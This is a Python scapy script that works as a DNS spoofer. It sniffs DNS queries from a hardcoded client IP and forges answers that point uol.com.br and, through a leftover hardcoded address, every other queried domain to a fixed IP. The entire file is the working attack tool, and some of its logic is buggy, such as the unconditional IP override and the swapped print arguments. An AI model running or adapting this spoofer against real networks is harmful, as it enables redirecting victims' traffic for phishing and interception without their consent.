import time
import dns.resolver
import netifaces as ni
import scapy.all as scapy
from scapy.all import DNSQR, DNSRR, DNS, IP, UDP

def handle_packet_fn(iface, spoof_ip, spoof_domains):
    def handle_packet(packet):
        ip = packet.getlayer(scapy.IP)
        udp = packet.getlayer(scapy.UDP)
        
        # Ignore packets containing data we aren't interested in.
        if hasattr(packet, 'qd') and packet.qd is not None:
            queried_host = packet.qd.qname[:-1].decode("utf-8")
            
            # If the queried_host is one of the domains we want
            # to spoof, return the spoof_ip.
            if queried_host in spoof_domains:
                print(">> Spoofing DNS request by %s" \
                    " for %s resolving"
                            % (queried_host, ip.src))
                            #% (queried_host, ip.src,resolved_ip))
                
                #time.sleep(1)

            # Else use dns.resolver to make a real DNS "A record"
            # request, and return the result of that.
            else:
                # print("Forwarding DNS request for %s by %s" %
                #         (queried_host, ip.src))
                a_records = dns.resolver.resolve(queried_host, 'A')                
                resolved_ip = a_records[0].address

            resolved_ip = '172.217.29.228'

             # Build the DNS answer
            dns_answer = DNSRR(
                rrname=queried_host + ".",
                ttl=330,
                type="A",
                rclass="IN",
                rdata=resolved_ip)
            # Build the DNS response by constructing the IP
            # packet, the UDP "datagram" that goes inside the
            # packet, and finally the DNS response that goes
            # inside the datagram.
            dns_response = \
                IP(src=ip.dst, dst=ip.src) / \
                UDP(
                    sport=udp.dport,
                    dport=udp.sport
                ) / \
                DNS(
                    id = packet[DNS].id,
                    qr = 1,
                    aa = 0,
                    rcode = 0,
                    qd = packet.qd,
                    an = dns_answer
                )

            # packet[DNS].ancount = 1

            # del packet[IP].len
            # del packet[IP].chksum
            # del packet[UDP].len
            # del packet[UDP].chksum
            # print("Resolved DNS request for %s to %s for %s" %
            #                     (queried_host, resolved_ip, ip.src))
            scapy.send(dns_response, iface=iface)
        else:
            print("Ignoring unrecognized packet from %s" % ip.src)

    return handle_packet

def run(iface, local_ip, sniff_filter, spoof_domains):
    print("#" * 40)
    print("-#-#-#-#-#-RUNNING DNS SPOOFER-#-#-#-#-#")
    print("#" * 40)
    print("Interface:\t\t%s" % iface)
    print("Resolving to IP:\t%s" % local_ip)
    print("Spoof domains:\t\t%s" % ', '.join(spoof_domains))
    print("BPF sniff filter:\t%s\n" % sniff_filter)
    print("Waiting for DNS requests...")
    print("(Make sure the device you are targeting is set to use"\
            " your local IP (%s) as its DNS server)" % local_ip)

    scapy.sniff(iface=iface,
                filter=sniff_filter,
                prn=handle_packet_fn(iface,
                                     local_ip,
                                     spoof_domains))

def _get_local_ip(iface):
    return ni.ifaddresses(iface)[ni.AF_INET][0]['addr']

def spoof():
    
    IFACE= 'wlp2s0'
    #IFACE = str(input("Type the Network Interface to be Used in spoof:\n"))
    
    local_ip = _get_local_ip(IFACE)
    client_ip = '192.168.0.150'

    SPOOF_DOMAINS = ['www.uol.com.br', 'uol.com.br']

    SNIFF_FILTER = ("udp port 53 && dst %s && src %s" % (local_ip,client_ip))

    run(IFACE, local_ip, SNIFF_FILTER, SPOOF_DOMAINS)

if __name__ == "__main__":
    spoof()
